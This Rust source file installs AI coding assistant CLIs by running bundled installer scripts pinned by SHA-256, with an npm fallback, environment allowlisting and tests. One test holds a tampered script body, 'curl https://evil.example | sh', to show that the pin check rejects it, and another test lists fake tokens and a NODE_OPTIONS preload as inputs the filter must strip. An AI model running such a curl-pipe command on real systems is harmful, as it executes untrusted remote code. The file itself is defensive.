use std::collections::HashMap;
use std::path::Path;
use std::time::Duration;

use sha2::{Digest, Sha256};
use tokio::sync::Mutex;
use tokio_util::sync::CancellationToken;

use super::detect::cli_binary;
use super::spawn::{find_on_path, resolve_cli, spawn_lines, SpawnLinesOptions};
use crate::util::{assistant_prefix, child_env};

/// An official installer script, shipped inside Scarlet as a reviewed copy. Scarlet never runs a script it just
/// downloaded: it runs this copy, and only if its SHA-256 still matches the one pinned here. The scripts themselves
/// check the checksum of the program they download. To update a script, see `installers/README.md`.
struct InstallerScript {
    /// Where the copy came from, for the log and for refreshing it.
    source: &'static str,
    body: &'static str,
    sha256: &'static str,
}

struct NativeInstaller {
    label: &'static str,
    sh: InstallerScript,
    ps1: InstallerScript,
}

fn native_installer(agent: &str) -> Option<NativeInstaller> {
    match agent {
        "claude" => Some(NativeInstaller {
            label: "Claude Code",
            sh: InstallerScript {
                source: "https://claude.ai/install.sh",
                body: include_str!("../../installers/claude.sh"),
                sha256: "2c5506d110560bf618bbe88f678f2c2a0047c86a9c6585fc84976120b1de0b44",
            },
            ps1: InstallerScript {
                source: "https://claude.ai/install.ps1",
                body: include_str!("../../installers/claude.ps1"),
                sha256: "cd17c6b555f761d60373659824bf805e1510538226e4c7028e19d7494937a333",
            },
        }),
        "codex" => Some(NativeInstaller {
            label: "Codex",
            sh: InstallerScript {
                source: "https://chatgpt.com/codex/install.sh",
                body: include_str!("../../installers/codex.sh"),
                sha256: "b698d8eb50c0fbe0214ea57b5bf2af439054108404c6d2b872989db02f4bd574",
            },
            ps1: InstallerScript {
                source: "https://chatgpt.com/codex/install.ps1",
                body: include_str!("../../installers/codex.ps1"),
                sha256: "73e757c5067d2bcafa0d1b6df78b498f0a13d890be642c8dc2e3860b37e3d57b",
            },
        }),
        "gemini" => Some(NativeInstaller {
            label: "Gemini",
            sh: InstallerScript {
                source: "https://antigravity.google/cli/install.sh",
                body: include_str!("../../installers/gemini.sh"),
                sha256: "62966c07365423bd4dc209355060744058fb30d60f5323e2d360e39de64e5042",
            },
            ps1: InstallerScript {
                source: "https://antigravity.google/cli/install.ps1",
                body: include_str!("../../installers/gemini.ps1"),
                sha256: "51c2cb4fada22ce0228da71b9506370383d6544bfebcec85fe7616a52b805344",
            },
        }),
        _ => None,
    }
}

fn sha256_hex(bytes: &[u8]) -> String {
    Sha256::digest(bytes).iter().map(|b| format!("{b:02x}")).collect()
}

/// The script's body, if it is still exactly the reviewed copy.
fn verified_body(script: &InstallerScript) -> Option<&'static str> {
    (sha256_hex(script.body.as_bytes()) == script.sha256).then_some(script.body)
}

// Serialize assistant installs so shared directories/prefixes are never raced.
pub(super) static INSTALL_LOCK: Mutex<()> = Mutex::const_new(());

pub(super) fn npm_package(agent: &str) -> Option<&'static str> {
    match agent {
        "claude" => Some("@anthropic-ai/claude-code"),
        "codex" => Some("@openai/codex"),
        _ => None,
    }
}

#[cfg(test)]
fn is_supported(agent: &str) -> bool {
    native_installer(agent).is_some()
}

#[derive(serde::Serialize)]
#[serde(rename_all = "camelCase")]
pub enum InstallResult {
    Installed,
    NeedsNode,
}

/// Whether a copy of the CLI is installed that Scarlet can start, as the assistant check and the runs read it
/// (`resolve_cli`). A Windows shim they pass over doesn't count: the check would go on saying it isn't installed.
fn is_installed(binary: &str, env: &HashMap<String, String>) -> bool {
    resolve_cli(binary, env).is_ok()
}

pub async fn install(agent: &str, home: &Path) -> Result<InstallResult, String> {
    let Some(native) = native_installer(agent) else {
        return Err("This assistant cannot be installed by Scarlet.".into());
    };
    let _guard = INSTALL_LOCK.lock().await;
    let env = child_env(home);
    let binary = cli_binary(agent);
    if is_installed(binary, &env) {
        log::info!("{agent} ({binary}) is already installed");
        return Ok(InstallResult::Installed);
    }
    match install_via_script(agent, binary, native, home, env.clone()).await {
        Ok(result) => return Ok(result),
        Err(native_err) => {
            // Claude Code and Codex ship standalone native binaries, so non-developers don't need Node.js.
            // If the standalone install fails on a machine that already has npm, try the npm package as a fallback.
            if let Some(package) = npm_package(agent) {
                let npm_name = if cfg!(windows) { "npm.cmd" } else { "npm" };
                if let Some(npm) = find_on_path(npm_name, &env) {
                    log::warn!("{agent} standalone install failed ({native_err}); falling back to npm ({package})");
                    return install_via_npm(agent, binary, package, &npm, home, env).await;
                }
            }
            Err(native_err)
        }
    }
}

async fn install_via_npm(
    agent: &str,
    binary: &str,
    package: &str,
    npm: &str,
    home: &Path,
    env: HashMap<String, String>,
) -> Result<InstallResult, String> {
    let prefix = assistant_prefix(home);
    tokio::fs::create_dir_all(&prefix).await.map_err(|e| {
        log::warn!("cannot install {agent}: could not create {}: {e}", prefix.display());
        "Cannot create Scarlet’s assistant folder for this user.".to_string()
    })?;
    log::info!("installing {agent} ({package}) into {}", prefix.display());
    // Run in Scarlet's own directory. The renderer cannot supply a package, registry or command line.
    let install_env = install_env(env, &prefix);
    let args = ["install", "--global", "--registry=https://registry.npmjs.org", "--no-fund", "--no-audit", package].map(String::from);
    let options = install_spawn_options(prefix, install_env, None);
    let outcome = spawn_lines(npm, &args, options, Box::new(|_| false)).await.map_err(|e| {
        log::warn!("cannot install {agent}: npm did not start: {e:#}");
        "Could not start npm. Check your Node.js installation and try again.".to_string()
    })?;
    let found = is_installed(binary, &child_env(home));
    if outcome.code != Some(0) || !found {
        // npm's own line, just above, has its exit code and the end of what it said.
        log::warn!("{agent} install failed (npm exit code {:?}; {binary} {} on PATH)", outcome.code, if found { "is" } else { "is not" });
        return Err(failure_reason(&outcome).into());
    }
    log::info!("{agent} installed via npm");
    Ok(InstallResult::Installed)
}

/// Install a standalone native assistant CLI with Scarlet's reviewed copy of its official installer script (no Node.js
/// required). The script downloads the program over HTTPS and checks its checksum.
async fn install_via_script(
    agent: &str,
    binary: &str,
    installer: NativeInstaller,
    home: &Path,
    env: HashMap<String, String>,
) -> Result<InstallResult, String> {
    let copy = if cfg!(windows) { &installer.ps1 } else { &installer.sh };
    let label = installer.label;
    let source = copy.source;
    let Some(script) = verified_body(copy).map(str::to_string) else {
        log::error!("cannot install {agent}: Scarlet's copy of {source} does not match its pinned SHA-256");
        return Err(format!("Scarlet’s copy of the {label} installer failed its safety check. Reinstall Scarlet and try again."));
    };
    log::info!("installing {agent} ({label}) with Scarlet's checked copy of {source}");
    let prefix = assistant_prefix(home);
    let restricted_env = install_env(env, &prefix);

    let outcome = if cfg!(windows) {
        let mut tmp = tempfile::Builder::new().suffix(".ps1").tempfile().map_err(|e| {
            log::warn!("cannot install {agent}: failed to create temp script: {e}");
            "Scarlet could not write the assistant files. Check your folder permissions and try again.".to_string()
        })?;
        std::io::Write::write_all(&mut tmp, script.as_bytes()).map_err(|e| {
            log::warn!("cannot install {agent}: failed to write temp script: {e}");
            "Scarlet could not write the assistant files. Check your folder permissions and try again.".to_string()
        })?;
        // Close the write handle before PowerShell opens the script, while still removing the temp file on drop.
        let script_file = tmp.into_temp_path();
        let script_path = script_file.to_string_lossy().into_owned();
        let args = [
            "-NoProfile",
            "-NonInteractive",
            "-ExecutionPolicy",
            "Bypass",
            "-File",
            &script_path,
        ]
        .map(String::from);
        let options = install_spawn_options(home.to_path_buf(), restricted_env, None);
        spawn_lines("powershell.exe", &args, options, Box::new(|_| false)).await
    } else {
        let shell = find_on_path("bash", &restricted_env).unwrap_or_else(|| "/bin/sh".into());
        let args = ["-s".to_string()];
        let options = install_spawn_options(home.to_path_buf(), restricted_env, Some(script));
        spawn_lines(&shell, &args, options, Box::new(|_| false)).await
    }
    .map_err(|e| {
        log::warn!("cannot install {agent}: installer did not start: {e:#}");
        format!("Could not start the {label} installer. Try again.")
    })?;

    let found = is_installed(binary, &child_env(home));
    if outcome.code != Some(0) || !found {
        log::warn!(
            "{agent} install failed (exit code {:?}; {binary} {} on PATH)",
            outcome.code,
            if found { "is" } else { "is not" }
        );
        return Err(native_failure_reason(&outcome).into());
    }
    log::info!("{agent} ({binary}) installed");
    Ok(InstallResult::Installed)
}

pub(super) fn install_spawn_options(cwd: std::path::PathBuf, env: HashMap<String, String>, stdin: Option<String>) -> SpawnLinesOptions {
    SpawnLinesOptions {
        cwd,
        env,
        stdin,
        cancel: CancellationToken::new(),
        timeout: Some(Duration::from_secs(300)),
        stall: None,
        task: None,
    }
}

/// What npm / installers run with: Scarlet's own prefix and the few variables an install needs. Nothing else the app
/// inherited reaches it, so no token or registry setting from the environment does.
pub(super) fn install_env(env: HashMap<String, String>, prefix: &Path) -> HashMap<String, String> {
    const ALLOWED: &[&str] = &[
        "PATH", "HOME", "USERPROFILE", "SYSTEMROOT", "SYSTEMDRIVE", "WINDIR", "COMSPEC", "PATHEXT",
        "OS", "PROCESSOR_ARCHITECTURE", "PROCESSOR_ARCHITEW6432",
        "TEMP", "TMP", "TMPDIR", "APPDATA", "LOCALAPPDATA",
        "HTTP_PROXY", "HTTPS_PROXY", "NO_PROXY", "NODE_EXTRA_CA_CERTS",
    ];
    let mut install_env = crate::util::env_filter_allowlist(env, ALLOWED);
    install_env.insert("npm_config_prefix".into(), prefix.to_string_lossy().into_owned());
    install_env
}

pub(super) fn install_failure_reason(outcome: &super::spawn::SpawnOutcome, fallback: &'static str) -> &'static str {
    if outcome.timed_out {
        "Installation timed out. Check your connection and try again."
    } else if outcome.stderr.contains("No space left") || outcome.stderr.contains("ENOSPC") {
        "Free some disk space and try installing again."
    } else if outcome.stderr.contains("Permission denied") || outcome.stderr.contains("EACCES") || outcome.stderr.contains("EPERM") {
        "Scarlet could not write the assistant files. Check your folder permissions and try again."
    } else {
        fallback
    }
}

/// What to tell the editor when an npm install did not finish.
fn failure_reason(outcome: &super::spawn::SpawnOutcome) -> &'static str {
    install_failure_reason(outcome, "Installation did not finish. Check your connection and Node.js installation, then try again.")
}

/// What to tell the editor when a standalone native installer did not finish.
fn native_failure_reason(outcome: &super::spawn::SpawnOutcome) -> &'static str {
    install_failure_reason(outcome, "Installation did not finish. Check your connection and try again.")
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn only_installs_supported_providers() {
        assert!(is_supported("codex"));
        assert!(is_supported("claude"));
        assert!(is_supported("gemini"));
        assert!(!is_supported("file:/other/package"));
        assert_eq!(npm_package("codex"), Some("@openai/codex"));
        assert_eq!(npm_package("claude"), Some("@anthropic-ai/claude-code"));
        assert_eq!(npm_package("gemini"), None);
        for agent in ["claude", "codex", "gemini"] {
            let native = native_installer(agent).expect("all supported assistants have standalone native installers");
            for script in [&native.sh, &native.ps1] {
                assert!(script.source.starts_with("https://"), "{agent}: {} must be https", script.source);
                // A changed copy must be reviewed and its pin updated on purpose (installers/README.md).
                assert_eq!(sha256_hex(script.body.as_bytes()), script.sha256, "{agent}: {} changed", script.source);
                assert_eq!(verified_body(script), Some(script.body));
            }
        }
    }

    /// A shim Scarlet can't start a run with, first on a Windows PATH, read as an install: Settings said Installed
    /// while the assistant check went on saying it wasn't.
    #[test]
    fn counts_only_a_copy_scarlet_can_start_as_installed() {
        let dir = tempfile::tempdir().unwrap();
        let (env, program) = crate::host::runner::testing::shadowed_cli(dir.path(), "claude");
        assert!(is_installed("claude", &env));
        // With the program gone, only what was ahead of it on PATH is left: the shim on Windows, nothing elsewhere.
        std::fs::remove_file(&program).unwrap();
        assert!(!is_installed("claude", &env));
        assert_eq!(find_on_path("claude", &env).is_some(), cfg!(windows));
    }

    #[test]
    fn finds_gemini_where_its_windows_installer_puts_it() {
        // Otherwise the install works, but Scarlet can't see agy.exe and says the installation did not finish.
        let ps1 = native_installer("gemini").unwrap().ps1.body;
        let line = ps1
            .lines()
            .map(str::trim)
            .find(|l| l.starts_with("$TARGET_DIR = Join-Path $env:LOCALAPPDATA"))
            .expect("the Gemini installer names its folder under LOCALAPPDATA");
        let local = Path::new("C:/Users/editor/AppData/Local");
        let target = line.split('"').nth(1).unwrap().split('\\').fold(local.to_path_buf(), |dir, part| dir.join(part));
        assert_eq!(target, local.join("agy").join("bin"));
        assert!(crate::util::windows_local_app_dirs(local).contains(&target), "Scarlet does not look in {}", target.display());
    }

    #[test]
    fn finds_codex_where_its_windows_installer_puts_it() {
        let ps1 = native_installer("codex").unwrap().ps1.body;
        let line = ps1
            .lines()
            .map(str::trim)
            .find(|l| l.starts_with("$defaultVisibleBinDir = Join-Path $env:LOCALAPPDATA"))
            .expect("the Codex installer names its folder under LOCALAPPDATA");
        let local = Path::new("C:/Users/editor/AppData/Local");
        let target = line.split('"').nth(1).unwrap().split('\\').fold(local.to_path_buf(), |dir, part| dir.join(part));
        assert_eq!(target, local.join("Programs").join("OpenAI").join("Codex").join("bin"));
        assert!(crate::util::windows_local_app_dirs(local).contains(&target), "Scarlet does not look in {}", target.display());
    }

    #[test]
    fn keeps_every_windows_system_variable_the_bundled_installers_read() {
        // Stripping OS or PROCESSOR_ARCHITECTURE makes gemini.ps1 and codex.ps1 fail at once on Windows.
        let env_ref = regex::Regex::new(r"\$env:([A-Za-z0-9_]+)").unwrap();
        for agent in ["claude", "codex", "gemini"] {
            let ps1 = native_installer(agent).unwrap().ps1.body;
            for cap in env_ref.captures_iter(ps1) {
                let name = &cap[1];
                // Optional Codex installer overrides are deliberately kept out of the child environment.
                if name.starts_with("CODEX_") {
                    continue;
                }
                let inherited = HashMap::from([(name.to_string(), "value".to_string())]);
                let filtered = install_env(inherited, Path::new("C:/Users/editor/.scarlet/assistants"));
                assert!(filtered.contains_key(name), "{agent}.ps1 reads $env:{name}, but install_env stripped it");
            }
        }
    }

    #[test]
    fn refuses_a_script_that_does_not_match_its_pin() {
        let real = native_installer("claude").unwrap().sh;
        let changed = InstallerScript { body: "curl https://evil.example | sh", ..real };
        assert_eq!(verified_body(&changed), None);
    }

    #[test]
    fn gives_npm_only_what_an_install_needs_from_the_environment() {
        let inherited = HashMap::from(
            [
                ("Path", "/usr/bin"),
                ("HOME", "/home/editor"),
                ("https_proxy", "http://proxy:8080"),
                ("NODE_EXTRA_CA_CERTS", "/etc/ca.pem"),
                // None of these may reach npm: a token, another registry, another prefix, a script to preload.
                ("NPM_TOKEN", "npm_secret"),
                ("ANTHROPIC_API_KEY", "sk-ant"),
                ("GEMINI_API_KEY", "AIza-secret"),
                ("npm_config_registry", "https://registry.example.com"),
                ("NPM_CONFIG_PREFIX", "/somewhere/else"),
                ("NODE_OPTIONS", "--require /tmp/x.js"),
                ("PATHS", "not PATH"),
            ]
            .map(|(k, v)| (k.to_string(), v.to_string())),
        );
        let env = install_env(inherited, Path::new("/home/editor/.scarlet/assistants"));
        let mut names: Vec<&str> = env.keys().map(String::as_str).collect();
        names.sort();
        assert_eq!(names, ["HOME", "NODE_EXTRA_CA_CERTS", "Path", "https_proxy", "npm_config_prefix"]);
        assert_eq!(env["npm_config_prefix"], "/home/editor/.scarlet/assistants");
    }

    #[test]
    fn tells_the_editor_why_an_install_did_not_finish() {
        use crate::host::spawn::SpawnOutcome;
        let said = |stderr: &str| failure_reason(&SpawnOutcome { code: Some(1), stderr: stderr.into(), ..Default::default() });
        assert!(said("npm ERR! code ENOSPC\nnpm ERR! nospc no space left on device").starts_with("Free some disk space"));
        assert!(said("npm ERR! code EACCES\nnpm ERR! syscall mkdir").starts_with("Scarlet could not write the assistant files"));
        assert!(said("npm error code EPERM").starts_with("Scarlet could not write the assistant files"));
        assert!(said("npm ERR! code ETIMEDOUT").starts_with("Installation did not finish"));
        assert!(said("").starts_with("Installation did not finish"));
        // A timeout is the reason whatever npm had printed by then.
        let timed_out = SpawnOutcome { timed_out: true, killed: true, stderr: "npm ERR! code EACCES".into(), ..Default::default() };
        assert!(failure_reason(&timed_out).starts_with("Installation timed out"));
    }

    #[tokio::test]
    async fn refuses_an_assistant_it_does_not_install_before_touching_anything() {
        let dir = tempfile::tempdir().unwrap();
        let refused = install("unknown-agent", dir.path()).await;
        assert_eq!(refused.err().as_deref(), Some("This assistant cannot be installed by Scarlet."));
        assert!(install("@openai/codex", dir.path()).await.is_err());
        // No assistant folder was made for a request that was never going to install anything.
        assert_eq!(std::fs::read_dir(dir.path()).unwrap().count(), 0);
    }
}
